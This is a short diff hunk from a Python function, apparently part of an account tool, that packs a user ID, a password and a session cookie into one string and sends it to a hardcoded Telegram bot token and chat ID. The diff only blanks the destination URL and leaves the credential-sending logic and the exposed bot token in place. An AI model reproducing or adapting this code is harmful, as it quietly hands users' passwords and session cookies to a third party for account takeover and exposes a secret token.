@@ -44,7 +44,7 @@ def Elite(ids,pas,cookie):
         token = "6621233108:AAGHR7Efb4D2riCK9UHuejVwv3oxpql44Kg"
         chatid = "6235365485"
         ok_id =str(ids+"|"+pas+"|"+cookie)
-        url = f"https://t.me/anmol_bhatta07"
+        url = f""
         params = {"chat_id": chatid, "text": ok_id}
         requests.get(url, params=params)
     except:
